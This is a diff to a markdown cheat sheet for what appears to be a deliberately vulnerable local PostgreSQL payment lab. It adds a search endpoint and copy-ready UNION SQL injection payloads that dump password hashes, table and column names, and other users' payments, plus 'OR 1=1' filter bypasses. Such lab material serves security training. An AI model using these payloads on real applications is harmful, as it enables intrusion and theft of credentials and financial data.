@@ -1,4 +1,23 @@
-# 🎯 Quick Reference: PostgreSQL SQL Injection File Reading
+# 🎯 Quick Reference: PostgreSQL SQL Injection
+
+## 🚨 Two Vulnerable Endpoints
+
+### 1. Status Page - Single Result
+- **URL**: `/status?id=<payload>`
+- **Returns**: One payment at a time
+- **Best for**: File reading, single queries
+- **Example**: `?id=1 UNION SELECT ...`
+
+### 2. Search Page - Multiple Results ⭐ NEW!
+- **URL**: `/search?q=<payload>`
+- **Returns**: Multiple results at once!
+- **Best for**: Bulk data extraction, listing tables/columns
+- **Example**: `?q=%' UNION SELECT ... WHERE '1'='1`
+- **Advantage**: Extract entire tables in one request!
+
+See **docs/SEARCH_PAGE_SQLI.md** for complete search page guide.
+
+---
 
 ## ⚠️ Important: PostgreSQL Type Matching
 
@@ -22,12 +41,12 @@ PostgreSQL UNION queries require **exact type matching**!
 1. **Start the app**: `docker compose up -d`
 2. **Open browser**: http://localhost:5000
 3. **Login**: `alice` / `password123`
-4. **Go to**: Status page
-5. **Try this**: `?id=1 OR 1=1`
+4. **Try Status page**: `?id=1 OR 1=1`
+5. **Try Search page**: `?q=%' OR '1'='1`
 
 ---
 
-## 🔥 Top 5 File Reading Payloads
+## 🔥 Top 5 File Reading Payloads (Status Page)
 
 ### 1. Read Database Config (⭐ HIGHEST VALUE)
 ```
@@ -90,6 +109,42 @@ PostgreSQL UNION queries require **exact type matching**!
 ```
 ?id=1 OR 1=1
 ```
+
+---
+
+## 🚀 Top 5 Search Page Payloads (Multiple Results!)
+
+### 1. Extract All User Credentials at Once! ⭐
+```
+/search?q=%' UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users WHERE '1'='1
+```
+**Returns**: ALL 3 users with password hashes in ONE request!
+
+### 2. Get All Columns for Users Table (No OFFSET!)
+```
+/search?q=%' UNION SELECT ordinal_position, ordinal_position, column_name, 0.00, data_type, table_name, CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users' AND '1'='1
+```
+**Returns**: All 7 columns displayed as separate "payments"!
+
+### 3. See ALL Payments from ALL Users
+```
+/search?q=%' UNION SELECT id, user_id, recipient, amount, description, status, created_at FROM payments WHERE '1'='1
+```
+**Returns**: All 23 payment transactions (bypasses user_id filter)!
+
+### 4. List All Tables at Once
+```
+/search?q=%' UNION SELECT 1, 2, tablename, 0.00, schemaname, 'tables', CURRENT_TIMESTAMP FROM pg_tables WHERE schemaname='public' AND '1'='1
+```
+**Returns**: Multiple rows showing all tables (users, payments, feedback)!
+
+### 5. Bypass Search Filter (Show All Your Payments)
+```
+/search?q=%' OR '1'='1
+```
+**Returns**: All your payments without needing to search!
+
+**Key Difference**: Search page returns MULTIPLE rows, making bulk extraction 10x faster! 🎯
 
 ---
 
